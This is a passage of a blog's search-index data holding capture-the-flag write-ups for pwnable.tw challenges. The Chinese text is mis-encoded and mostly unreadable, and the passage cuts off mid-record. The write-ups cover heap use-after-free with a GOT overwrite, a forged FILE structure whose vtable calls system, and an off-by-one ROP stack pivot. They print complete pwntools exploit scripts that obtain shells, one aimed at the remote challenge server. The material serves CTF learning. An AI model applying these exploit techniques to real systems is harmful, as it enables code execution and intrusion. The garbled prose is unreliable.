200åˆ†çš„é¢˜ç›¸å¯¹å®¹æ˜“ç‚¹ï¼Œåé¢å°±éš¾èµ·æ¥äº†ğŸŒ©","link":"/2020/10/17/Pwnable_hacknote/"},{"title":"Pwnable.tw re-alloc","text":"Pwmable.tw Re-alloc åˆ©ç”¨æ€è·¯æŒºæ–°å¥‡çš„ï¼Œå­¦åˆ°äº†å­¦åˆ°äº†ğŸ¤™ å…¸å‹èœå•é¢˜ï¼Œä½†libcç‰ˆæœ¬ä¸º2.29ï¼Œæ„å‘³ç€tecacheé‡Œé¢0x8çš„ä½ç½®ä¼šæ”¾å…¥keyæŒ‡å‘tecache_structï¼Œè‹¥è¦æƒ³double freeï¼Œåªèƒ½æ”¹æ‰keyå€¼ã€‚ addå‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930printf(&quot;Index:&quot;); idx = read_long(); if ( idx &gt; 1 || heap[idx] ) { LODWORD(v0) = puts(&quot;Invalid !&quot;); } else { printf(&quot;Size:&quot;); size = read_long(); if ( size &lt;= 0x78 ) { v4 = realloc(0LL, size); if ( v4 ) { heap[idx] = v4; printf(&quot;Data:&quot;); v0 = (_BYTE *)(heap[idx] + read_input(heap[idx], size)); *v0 = 0; // off_by_one } else { LODWORD(v0) = puts(&quot;alloc error&quot;); } } else { LODWORD(v0) = puts(&quot;Too large!&quot;); } } åªå…è®¸ç”³è¯·ä¸¤ä¸ªå‡½æ•°ï¼Œoff_by_oneæ„Ÿè§‰ç”¨ä¸äº†äº†ã€‚ deleå‡½æ•°ï¼š 123456789101112printf(&quot;Index:&quot;);v2 = read_long();if ( v2 &gt; 1 ){ LODWORD(v0) = puts(&quot;Invalid !&quot;);}else{ realloc((void *)heap[v2], 0LL); v0 = heap; heap[v2] = 0LL;} ä¹Ÿæ²¡æœ‰é‡æŒ‡é’ˆï¼Ÿ editå‡½æ•°ï¼š 1234567891011121314printf(&quot;Index:&quot;);v1 = read_long();if ( v1 &gt; 1 || !heap[v1] ) return puts(&quot;Invalid !&quot;);printf(&quot;Size:&quot;);size = read_long();if ( size &gt; 0x78 ) return puts(&quot;Too large!&quot;);v3 = realloc((void *)heap[v1], size);if ( !v3 ) return puts(&quot;alloc error&quot;);heap[v1] = v3;printf(&quot;Data:&quot;);return read_input(heap[v1], size); è¿™ä¸€éçœ‹ä¸‹æ¥å‘ç°éƒ½æ˜¯åˆ©ç”¨reallocå‡½æ•°æ¥å®Œæˆå„ç§æ“ä½œï¼Œè¿™é‡Œå¯¹reallocè¿›è¡Œä¸€ä¸ªè¯´æ˜ï¼š reallocç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ªæŒ‡é’ˆptrï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºsizeã€‚å½“ptr=NULLæ—¶ç›¸å½“äºmalloc(size)å½“pträ¸ä¸ºnullï¼Œä¸”sizeä¸ä¸º0æ—¶ï¼Œå…ˆmalloc(size)ï¼Œå†æŠŠptré‡Œçš„å†…å®¹æ‹·è´åˆ°æ–°å†…å­˜é‡Œï¼ˆsizeå¤§äºold_sizeï¼Œæ‰©å®¹ï¼›sizeå°äºold_szieï¼Œåˆ‡å‰²ï¼‰ã€‚å½“pträ¸ä¸ºnullï¼Œsize=0æ—¶ï¼Œç›¸å½“äºfree(ptr)ã€‚ å› æ­¤å¯ä»¥æƒ³åˆ°editå‡½æ•°é‡Œçš„reallocå‡½æ•°çš„sizeæ˜¯ç”±æˆ‘ä»¬çš„è¾“å…¥å†³å®šçš„ï¼Œå¦‚æœsizeä¸º0ï¼Œåˆ™free(ptr)ï¼Œå½¢æˆUAFğŸˆ ä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜åœ¨äºæ²¡æœ‰showå‡½æ•°ï¼Œè€Œä¸”åªæœ‰2ä¸ªèƒ½ç”¨çš„å †å—æ˜¯æ— æ³•å®ç°å¯¹stdoutçš„åŠ«æŒçš„ã€‚ã€‚ è¿™é“é¢˜æä¾›äº†ä¸€ä¸ªæ–°çš„æ€è·¯ï¼šæ”¹å†™atoll_gotä¸ºprintf_pltï¼Œæ„é€ fmtæ³„éœ²ã€‚ ç”±äºatollå‚æ•°ä¸º&amp;bufï¼Œæ”¹ä¸ºprintfçš„è¯è‡ªç„¶å½¢æˆfmtï¼Œå¾ˆå¦™ã€‚ é‚£æ¥ä¸‹æ¥å°±æ˜¯æ¼æ´åˆ©ç”¨äº†ï¼Œå…ˆuafæ”¹fdä¸ºatoll_gotï¼Œä¹‹åadd,è¿™æ ·chunk0=chunk1(0x20)ï¼Œä¸”tecacheçš„0x20ä¸Šæ®‹ç•™äº†ä¸€ä¸ªatoi_gotçš„åœ°å€ã€‚ç„¶åedit chunk0ä¸ºè¾ƒå¤§çš„sizeï¼Œå¹¶dele(0)ï¼ŒåŒæ—¶edit chunk1å’Œchunk0ç›¸ç­‰çš„sizeï¼ŒåŒæ—¶è¦†ç›–key(ä¸ç„¶dele(1)æ—¶ä¼šæŠ¥é”™)ï¼Œä¹‹ådele(1),è¿™æ ·ä¸€ä¸ªæµç¨‹ä¸‹æ¥å°±ä½¿å¾—å³åœ¨0x20çš„tecache binä¸Šç•™ä¸‹åœ°å€ï¼Œåˆæ¸…ç©ºäº†ä¸¤ä¸ªå †ã€‚ é‡å¤ä¸Šé¢çš„æµç¨‹ä½¿å¾—åœ¨tecacheçš„å¤šä¸ªsizeé“¾ä¸Šç•™ä¸‹atoll_gotï¼Œæ–¹ä¾¿åé¢çš„åˆ©ç”¨ã€‚ ä¹‹åå°±æ˜¯ä¿®æ”¹atoll_gotä¸ºprintf_plt(æœ€å¥½ä¸è¦ç”¨0x20çš„é‚£ä¸ªatoll_got)ï¼Œä»è€Œleakã€‚ leakå®Œåç”±äºatollè¢«æ”¹æˆäº†printfï¼Œä½¿å¾—æˆ‘ä»¬åœ¨addæ—¶çš„è¾“å…¥è¦æœ‰æ‰€å˜åŒ–ï¼Œåˆ©ç”¨printfçš„è¿”å›å€¼ä¸ºè¾“å‡ºçš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œæˆ‘ä»¬é€šè¿‡add(â€˜aâ€™+â€™\\0â€™,â€™aâ€™*0x10+â€™\\0â€™)æ¥ç”³è¯·å‡º0x20å¤§å°çš„tecache binï¼Œæ”¹atoll_gotä¸ºsystemæ‹¿åˆ°shellğŸš© EXP: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level='debug'DEBUG=1if DEBUG: # p=process(&quot;./re-alloc&quot;,env={&quot;LD_PRELOAD&quot;:'./libc.so'}) p=process([&quot;/home/an9ela/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ld-2.29.so&quot;,&quot;./re-alloc&quot;],env={&quot;LD_PRELOAD&quot;:&quot;/home/an9ela/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;}) elf=ELF(&quot;./re-alloc&quot;) libc=ELF(&quot;./libc.so&quot;)else: p=remote(&quot;chall.pwnable.tw&quot;,10106) libc=ELF(&quot;./libc.so&quot;)def cmd(command): p.recvuntil(&quot;Your choice: &quot;) p.sendline(str(command))def add(idx,sz,data): cmd(1) p.recvuntil(&quot;Index:&quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size:&quot;) p.sendline(str(sz)) p.recvuntil(&quot;Data:&quot;) p.send(data)def edit(idx,sz,data): cmd(2) p.recvuntil(&quot;Index:&quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size:&quot;) p.sendline(str(sz)) if sz!=0: p.recvuntil(&quot;Data:&quot;) p.send(data)def dele(idx): cmd(3) p.recvuntil(&quot;Index:&quot;) p.sendline(str(idx))def pwn(): add(0,0x18,'a'*0x8) edit(0,0,'') edit(0,0x18,p64(0x404048)) add(1,0x18,'a'*0x8) edit(0,0x38,'a'*8) dele(0) edit(1,0x38,'b'*0x10) dele(1) add(0,0x48,'a'*0x8) edit(0,0,'') edit(0,0x48,p64(0x404048)) add(1,0x48,'a'*0x8) edit(0,0x58,'a'*8) dele(0) edit(1,0x58,'b'*0x10) dele(1) add(0,0x48,p64(0x00401070)) cmd(1) p.recvuntil(&quot;Index:&quot;) p.sendline('%p-%p+%p') p.recvuntil('+') libc.address=int(p.recv(14),16)-0x12e009 info(&quot;libc: &quot;+hex(libc.address)) cmd(1) p.recvuntil(&quot;:&quot;) p.sendline('a'+'\\x00') p.recvuntil(&quot;:&quot;) p.send('a'*15+'\\x00') p.recvuntil(&quot;Data:&quot;) p.send(p64(libc.sym['system'])) # add('a'+'\\x00','a'*0x48+'\\x00',p64(libc.sym['system'])) # add(3,0x20,p64(elf.got['printf'])) gdb.attach(p) cmd(3) p.recvuntil(&quot;Index:&quot;) p.sendline(&quot;/bin/sh\\x00&quot;) p.interactive()if __name__ == &quot;__main__&quot;: pwn()","link":"/2020/10/19/Pwnable_re-alloc/"},{"title":"Pwnable.tw seethefile","text":"Pwnable.tw seethefile ç¬¬äºŒæ¬¡åšè¿™é“é¢˜äº†ï¼Œææ‡‚äº†ç¬¬ä¸€æ¬¡åšè¿™é¢˜ä¸æ‡‚çš„ä¸€äº›ç»†èŠ‚âœˆ ç¨‹åºå…è®¸æˆ‘ä»¬open_file,read_file,write_fileï¼Œå”¯ä¸€å‘ç°çš„æ¼æ´æ˜¯åœ¨leave_massageçš„æ—¶å€™è¾“å…¥nameå¯ä»¥è¦†å†™åˆ°bssä¸Šçš„fd. 12345678910111213case 5: printf(&quot;Leave your name :&quot;); __isoc99_scanf(&quot;%s&quot;, name); printf(&quot;Thank you %s ,see you next time\\n&quot;, name);.bss:0804B0C0 magicbuf db 1A0h dup(?) ; DATA XREF: openfile+33â†‘o.bss:0804B0C0 ; readfile+17â†‘o ....bss:0804B260 public name.bss:0804B260 name db 20h dup( ?) ; DATA XREF: main+9Fâ†‘o.bss:0804B260 ; main+B4â†‘o.bss:0804B280 ; FILE *fp.bss:0804B280 fp dd ? ; DATA XREF: openfile+6â†‘r.bss:0804B280 ; openfile+ADâ†‘w ... å¹¶ä¸”é¢˜ç›®åŠŸèƒ½æ˜¯åœ¨äºå¯¹æ–‡ä»¶çš„æ“ä½œï¼Œè°ƒç”¨fread,fwrite,fopen,fcloseï¼Œé‚£è¿™é¢˜å°±æ˜¯è€ƒå¯Ÿio_fileäº†ã€‚ å¯¹äºio_fileçš„åˆ©ç”¨ï¼Œä¸€èˆ¬æ˜¯ç›´æ¥è¦†ç›–vtableç»“æ„ä½“æŒ‡é’ˆæŒ‡å‘å¯æ§çš„å†…å­˜ï¼Œå†è€…å°±æ˜¯æ„é€ æ•´ä¸ªio_file_plusç»“æ„ä½“ï¼Œä½†è¿™ç§æ–¹æ³•è¦æ±‚æˆ‘ä»¬æ„é€ æ—¶è¦ç»•è¿‡ä¸€äº›æ£€æŸ¥ã€‚ 1234567891011#define _IO_IS_FILEBUF 0x2000if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp);_IO_acquire_lock (fp);if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp);else status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;_IO_release_lock (fp);_IO_FINISH (fp); æˆ‘ä»¬è¦æ„é€ å‡º_IO_IS_FILEBUF=0çš„_flagsï¼Œä½¿å¾—å¯ä»¥ç»•è¿‡ä¸Šé¢ä¸¤ä¸ªæ£€æµ‹ä¾‹å¦‚_flags=0xffffdfffï¼ˆåŸç†åœ¨äº0xdf=(11011111),0x20=(0010000),0xdf&amp;0x20==0ï¼‰ï¼Œæœ€ç»ˆæ‰§è¡Œ_IO_FINISH (fp)ï¼› åœ¨Cè¯­è¨€ä¸­ï¼ŒæˆåŠŸè°ƒç”¨fopenå‡½æ•°åä¼šåœ¨å †ä¸Šåˆ†é…ä¸€å—ç©ºé—´ç”¨äºå­˜æ”¾_IO_FILE_plusç»“æ„ä½“ï¼Œå¹¶ä¸”è¿”å›ç»“æ„ä½“çš„é¦–åœ°å€ï¼Œè€Œåœ¨è°ƒç”¨fcloseæ—¶ï¼Œæœ€ç»ˆä¼šé€šè¿‡io_file_plusé‡Œçš„vatbleè°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚ 123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; telescope 0x9003008 8000:0000â”‚ 0x9003008 â—‚â€” 0x001:0004â”‚ 0x900300c â—‚â€” 0x16102:0008â”‚ 0x9003010 â—‚â€” 0xfbad2488 //_flags03:000câ”‚ 0x9003014 â€”â–¸ 0x900321d â—‚â€” 0xa5d6f73 ('so]\\n') //io_read_ptr04:0010â”‚ 0x9003018 â€”â–¸ 0x90033aa â—‚â€” 0x31203130 ('01 1') //io_read_end05:0014â”‚ 0x900301c â€”â–¸ 0x9003170 â—‚â€” 0x30303030 ('0000') //io_read_base... â†“0a:0028â”‚ 0x9003030 â€”â–¸ 0x9003570 â—‚â€” 0x00b:002câ”‚ 0x9003034 â—‚â€” 0x0... â†“0f:003câ”‚ 0x9003044 â€”â–¸ 0xf7fa1cc0 (_IO_2_1_stderr_) â—‚â€” 0xfbad2086 //_chain10:0040â”‚ 0x9003048 â—‚â€” 0x311:0044â”‚ 0x900304c â—‚â€” 0x0... â†“14:0050â”‚ 0x9003058 â€”â–¸ 0x90030a8 â—‚â€” 0x015:0054â”‚ 0x900305c â—‚â€” 0xffffffff... â†“17:005câ”‚ 0x9003064 â—‚â€” 0x018:0060â”‚ 0x9003068 â€”â–¸ 0x90030b4 â—‚â€” 0x019:0064â”‚ 0x900306c â—‚â€” 0x0... â†“1c:0070â”‚ 0x9003078 â—‚â€” 0xffffffff1d:0074â”‚ 0x900307c â—‚â€” 0x0... â†“27:009câ”‚ 0x90030a4 â€”â–¸ 0xf7fa0ac0 (_IO_file_jumps) â—‚â€” 0x0 //vatable28:00a0â”‚ 0x90030a8 â—‚â€” 0x0... â†“pwndbg&gt; telescope 0xf7fa0ac0 3000:0000â”‚ 0xf7fa0ac0 (_IO_file_jumps) â—‚â€” 0x0... â†“02:0008â”‚ 0xf7fa0ac8 (_IO_file_jumps+8) â€”â–¸ 0xf7e57990 (_IO_file_finish) â—‚â€” push ebx03:000câ”‚ 0xf7fa0acc (_IO_file_jumps+12) â€”â–¸ 0xf7e583b0 (_IO_file_overflow) â—‚â€” push edi04:0010â”‚ 0xf7fa0ad0 (_IO_file_jumps+16) â€”â–¸ 0xf7e58150 (_IO_file_underflow) â—‚â€” push ebp05:0014â”‚ 0xf7fa0ad4 (_IO_file_jumps+20) â€”â–¸ 0xf7e59230 (_IO_default_uflow) â—‚â€” push ebx06:0018â”‚ 0xf7fa0ad8 (_IO_file_jumps+24) â€”â–¸ 0xf7e5a0c0 (_IO_default_pbackfail) â—‚â€” push ebp å› æ­¤æˆ‘ä»¬åªè¦æ„é€ å¥½_IO_FILE_plusç»“æ„ä½“ï¼Œå¹¶é€šè¿‡nameçš„æº¢å‡ºæ”¹fdæŒ‡å‘æˆ‘ä»¬æ„é€ çš„_IO_FILE_plusç»“æ„ä½“ï¼Œå†æ‰§è¡Œfcloseå³å¯å®Œæˆåˆ©ç”¨ã€‚ é¦–å…ˆè¦Leakï¼Œé¢˜ç›®ç»™äº†æˆ‘ä»¬ä»»æ„æ–‡ä»¶è¯»çš„æœºä¼šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å–**â€™/proc/self/mapsâ€™**ï¼ˆæ–‡ä»¶çš„å†…å­˜ä¿¡æ¯å­˜å‚¨äºæ­¤ï¼‰æ¥å¾—åˆ°libcåœ°å€ã€‚ æ¥ä¸‹æ¥å°±æ˜¯æ„é€ file_plusç»“æ„ä½“ï¼Œå‡ å¤„è¦ç‚¹ï¼š 1.æ„é€ _flag=0xffffdfffï¼Œç»•è¿‡æ£€æµ‹å»æ‰§è¡Œ((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp) 2.åœ¨fdæŒ‡å‘å†…å­˜çš„åç§»ä¸º0x4ä½ç½®å†™å…¥â€™;$0â€™ï¼Œ;ç”¨æ¥åˆ†éš”å‘½ä»¤ã€‚ 3.io_fileç»“æ„ä½“å¤§å°ä¸º0x94ï¼Œå› æ­¤è¦å¡«å……æ»¡0x94ã€‚ 4.vatbleæŒ‡é’ˆæŒ‡å‘ç´§æ¥ç€çš„fileç»“æ„ä½“çš„å†…å­˜ï¼Œæ–¹ä¾¿åé¢çš„æ„é€ ã€‚ 5.vtableç»“æ„ä½“å¯¹åº”çš„__finishå‡½æ•°æŒ‡é’ˆ(ç¬¬3ä¸ªä½ç½®)å†™ä¸ºsystem() fake_struct: 123456789pwndbg&gt; telescope 0x804b300 8000:0000â”‚ eax 0x804b300 â—‚â€” 0xffffdfff01:0004â”‚ 0x804b304 â—‚â€” 0x30243b /* ';$0' */02:0008â”‚ 0x804b308 â—‚â€” 0x0... â†“25:0094â”‚ 0x804b394 â€”â–¸ 0x804b398 â€”â–¸ 0xf7e28db0 (system) â—‚â€” sub esp, 0xc26:0098â”‚ 0x804b398 â€”â–¸ 0xf7e28db0 (system) â—‚â€” sub esp, 0xc... â†“29:00a4â”‚ 0x804b3a4 â—‚â€” 0x0 æ‰§è¡Œ((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp)ç›¸å½“äºæ‰§è¡Œsystem(â€œxxx;$0â€)å¾—åˆ°shellğŸš© EXP: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *context.log_level='debug'def cmd(command): p.recvuntil(&quot;Your choice :&quot;) p.sendline(str(command))def openfile(name): cmd(1) p.recvuntil('What do you want to see :') p.sendline(name)def readfile(): cmd(2)def writefile(): cmd(3)def closefile(): cmd(4)def leave(name): cmd(5) p.recvuntil(&quot;Leave your name :&quot;) p.sendline(name)def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./seethefile&quot;) openfile(&quot;/proc/self/maps&quot;) readfile() readfile() readfile() writefile() p.recvline() libc.address=int(p.recv(8),16)-0x1b4000+0x1000 success(&quot;libc : &quot;+hex(libc.address)) fake_struct=0x0804B300 payload='a'*0x20+p32(fake_struct) #fd-&gt;fake_struct payload+='a'*(fake_struct-0x0804B280-4) payload+='\\xff\\xdf\\xff\\xff;$0\\x00'.ljust(0x94, '\\x00') payload+=p32(fake_struct+0x98) payload+=p32(libc.sym['system'])*3 gdb.attach(p,'b*0x08048B0F') leave(payload) # gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot;: libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) main(0) fcloseéƒ¨åˆ†æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* libio/iofclose.c */int_IO_new_fclose (_IO_FILE *fp){ int status;/*è¿™é‡Œæœ¬æ¥æœ‰ä¸ªå¯¹ç‰ˆæœ¬è¿›è¡Œæ£€æµ‹çš„ä»£ç ï¼Œæ ¹æ®FILEç»“æ„ä¸­_vtable_offsetå˜é‡æ˜¯å¦ä¸º0æ¥åˆ¤æ–­ï¼Œä¸ä¸º0åˆ™æ‰§è¡Œ_IO_old_fclose*/ /* First unlink the stream. */ if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); // unlinkå³ï¼šå°†fpæŒ‡å‘çš„FILEç»“æ„ä½“ä»_IO_list_allçš„å•å‘é“¾è¡¨ä¸­å–ä¸‹ _IO_acquire_lock (fp); if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); //å…³é—­fp else status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0; _IO_release_lock (fp); _IO_FINISH (fp); if (fp-&gt;_mode &gt; 0) {#if _LIBC /* This stream has a wide orientation. This means we have to free the conversion functions. */ struct _IO_codecvt *cc = fp-&gt;_codecvt; __libc_lock_lock (__gconv_lock); __gconv_release_step (cc-&gt;__cd_in.__cd.__steps); __gconv_release_step (cc-&gt;__cd_out.__cd.__steps); __libc_lock_unlock (__gconv_lock);#endif } else { if (_IO_have_backup (fp)) _IO_free_backup_area (fp); } if (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr) { fp-&gt;_IO_file_flags = 0; free(fp); } return status;} å‚è€ƒåšæ–‡:(https://www.jianshu.com/p/0176ebe02354)","link":"/2020/10/18/Pwnable_seethefile/"},{"title":"Pwnable.tw silver_bullet","text":"Pwnable.tw silver_bullet å¥½ä¹…ä¹‹å‰åšè¿‡ä¸€æ¬¡ï¼Œå½“æ—¶ä¸æ€ä¹ˆä¼šè°ƒï¼Œæ ˆæ„é€ çš„ä¹±ä¸ƒå…«ç³Ÿçš„ï¼Œç°åœ¨å†æ¥åšæ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹ä¸œè¥¿çš„ğŸ˜‚ è¿™é¢˜å¤§æ¦‚æµç¨‹å°±æ˜¯å…ˆcreate_bulletï¼Œå†å¢åŠ powerï¼Œæœ€åå»æŒ‘æˆ˜boss(HP=0x7f000000),æˆåŠŸå°±é€€å‡ºäº†ï¼Œå•Šè¿™ ç¨‹åºçš„æ¼æ´ç‚¹åœ¨power_upï¼š 12345678910111213141516171819int __cdecl power_up(char *dest){ char s; // [esp+0h] [ebp-34h] size_t v3; // [esp+30h] [ebp-4h] v3 = 0; memset(&amp;s, 0, 0x30u); //è¿™é‡Œçš„destæ˜¯å°±æ˜¯æˆ‘æ‰€è¯´çš„mainå‡½æ•°sï¼Œè€Œè¿™é‡Œçš„såªæ˜¯è¿™ä¸ªå‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚ if ( !*dest ) return puts(&quot;You need create the bullet first !&quot;); if ( *((_DWORD *)dest + 0xC) &gt; 47u ) return puts(&quot;You can't power up any more !&quot;); printf(&quot;Give me your another description of bullet :&quot;); read_input(&amp;s, 0x30 - *((_DWORD *)dest + 12)); strncat(dest, &amp;s, 48 - *((_DWORD *)dest + 12)); v3 = strlen(&amp;s) + *((_DWORD *)dest + 12); printf(&quot;Your new power is : %u\\n&quot;, v3); *((_DWORD *)dest + 12) = v3; return puts(&quot;Enjoy it !&quot;);} strncatå‡½æ•°åœ¨æ‰§è¡Œå®Œæ‹¼æ¥åä¼šåœ¨æœ«å°¾åŠ ä¸Šä¸€ä¸ª\\0ï¼Œå¦‚æœæˆ‘ä»¬å…ˆåˆ›é€ 47ä¸ªbulletç„¶åå†powe_upä¸€ä¸ªï¼Œé‚£åœ¨strncatçš„æ—¶å€™å°±ä¼šåœ¨s+0x30çš„ä½ç½®å†™å…¥ä¸€ä¸ªå­—èŠ‚çš„\\0ï¼Œå¯¼è‡´ä¹‹å‰å­˜æ”¾åœ¨è¿™é‡Œçš„sizeæ•°æ®è¢«è¦†ç›–ä¸º0ï¼Œç„¶åå†ä¹‹åçš„strlen(&amp;s) + *((_DWORD *)dest + 12)è®¡ç®—çš„ç»“æœå°±æ˜¯1äº†ã€‚ ä»è€Œæˆ‘ä»¬æœ‰äº†ç»§ç»­å‘ä¸‹æ‹¼æ¥çš„æœºä¼šï¼Œåœ¨ä¹‹åçš„æ‹¼æ¥ä¼šåœ¨s+0x30å¼€å§‹æˆ‘ä»¬å¯ä»¥å…ˆä¼ªé€ sizeå¤§äº0x7fffffffï¼Œç„¶åå°±åˆ°äº†ebpçš„ä½ç½®ï¼Œä¼ªé€ ebpä¸ºbssåœ°å€ï¼Œè¿”å›åœ°å€ç”¨puts_pltè¦†ç›–ï¼Œæ¥ä¸‹æ¥å†™è¿›å»pop_ebxâ€”â€”retä½œä¸ºputsçš„è¿”å›åœ°å€æ¥æ¸…ç†æ ˆå¹¶æ¥ç€retï¼Œä¹‹åå†™putså‡½æ•°çš„å‚æ•°ä¸ºputs_gotï¼Œç„¶åå†™å…¥input_readçš„åœ°å€ï¼Œä½¿å¾—åœ¨pop_ebx_retæ—¶å»æ‰§è¡Œread_inputsï¼Œæ¥ä¸‹æ¥è®¾ç½®readçš„å‚æ•°ä¸ºä¸Šé¢çš„bssçš„æ®µå’Œè¾“å…¥çš„sizeï¼ˆå¤Ÿç”¨å°±è¡Œï¼‰ï¼Œä¹‹åè¿”å›åœ°å€å†™æˆleave_retä½¿å¾—ä¸¤æ¬¡leaveæŠŠæ ˆè¿ç§»åˆ°bsså»æ‰§è¡Œæˆ‘ä»¬input_readè¾“å…¥çš„systemã€‚ æ‹¼æ¥çš„æ•ˆæœå¦‚ä¸‹ï¼š 12345678910111215:0054â”‚ eax 0xffddc584 â—‚â€” 0x61616161 ('aaaa')... â†“20:0080â”‚ 0xffddc5b0 â—‚â€” 0x62616161 ('aaab')21:0084â”‚ 0xffddc5b4 â—‚â€” 0xffffff01 --&gt;size22:0088â”‚ 0xffddc5b8 â€”â–¸ 0x804b410 â—‚â€” 0x0 --&gt;bss23:008câ”‚ 0xffddc5bc â€”â–¸ 0x80484a8 â—‚â€” jmp dword ptr [0x804afdc] --&gt;ret_addr24:0090â”‚ 0xffddc5c0 â€”â–¸ 0x8048475 (_init+33) â—‚â€” pop ebx --&gt;pop_ret25:0094â”‚ 0xffddc5c4 â€”â–¸ 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) â€”â–¸ 0xf7d88cb0 (puts) â—‚â€” push ebp26:0098â”‚ edx-1 0xffddc5c8 â€”â–¸ 0x80485eb (read_input) â—‚â€” push ebp27:009câ”‚ 0xffddc5cc â€”â–¸ 0x8048a18 (main+196) â—‚â€” leave28:00a0â”‚ 0xffddc5d0 â€”â–¸ 0x804b410 â—‚â€” 0x029:00a4â”‚ 0xffddc5d4 â—‚â€” 0x1011 ä¹‹åæ‰§è¡Œbeatsè·èƒœï¼Œmainå‡½æ•°å°†æ‰§è¡Œè¿”å› 123456789101112131415161718192021222324252627282930313233EAX 0x0 EBX 0x0 ECX 0xffffffff EDX 0xf7fa0870 (_IO_stdfile_1_lock) â—‚â€” 0x0 EDI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0 ESI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0 EBP 0x804b410 â—‚â€” 0x0 ESP 0xffb8d030 â€”â–¸ 0x8048475 (_init+33) â—‚â€” pop ebx EIP 0xf7e4bcb0 (puts) â—‚â€” push ebpâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 0x80489db &lt;main+135&gt; mov eax, 0 0x80489e0 &lt;main+140&gt; jmp main+196 &lt;0x8048a18&gt; â†“ 0x8048a18 &lt;main+196&gt; leave 0x8048a19 &lt;main+197&gt; ret â†“ 0x80484a8 jmp dword ptr [0x804afdc] &lt;0xf7e4bcb0&gt; â†“ â–º 0xf7e4bcb0 &lt;puts&gt; push ebp 0xf7e4bcb1 &lt;puts+1&gt; mov ebp, esp 0xf7e4bcb3 &lt;puts+3&gt; push edi 0xf7e4bcb4 &lt;puts+4&gt; push esi 0xf7e4bcb5 &lt;puts+5&gt; push ebx 0xf7e4bcb6 &lt;puts+6&gt; call __x86.get_pc_thunk.bx &lt;0xf7f0bc55&gt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp 0xffb8d030 â€”â–¸ 0x8048475 (_init+33) â—‚â€” pop ebx01:0004â”‚ 0xffb8d034 â€”â–¸ 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) â€”â–¸ 0xf7e4bcb0 (puts) â—‚â€” push ebp02:0008â”‚ 0xffb8d038 â€”â–¸ 0x80485eb (read_input) â—‚â€” push ebp03:000câ”‚ 0xffb8d03c â€”â–¸ 0x8048a18 (main+196) â—‚â€” leave04:0010â”‚ 0xffb8d040 â€”â–¸ 0x804b410 â—‚â€” 0x005:0014â”‚ 0xffb8d044 â—‚â€” 0x101106:0018â”‚ 0xffb8d048 â€”â–¸ 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db007:001câ”‚ 0xffb8d04c â€”â–¸ 0xf7fe7c04 â—‚â€” 0x0 å…ˆæ‰§è¡Œputs(puts_got) leakåè¿”å›åˆ°pop_rbx_retæ¸…ç†stackå¹¶è·³åˆ°read_input 12345678910111213141516171819202122232425262728EAX 0x5EBX 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) â€”â–¸ 0xf7e4bcb0 (puts) â—‚â€” push ebpECX 0xffffffffEDX 0xf7fa0870 (_IO_stdfile_1_lock) â—‚â€” 0x0EDI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0ESI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0EBP 0x804b410 â—‚â€” 0x0ESP 0xffb8d03c â€”â–¸ 0x8048a18 (main+196) â—‚â€” leaveEIP 0x80485eb (read_input) â—‚â€” push 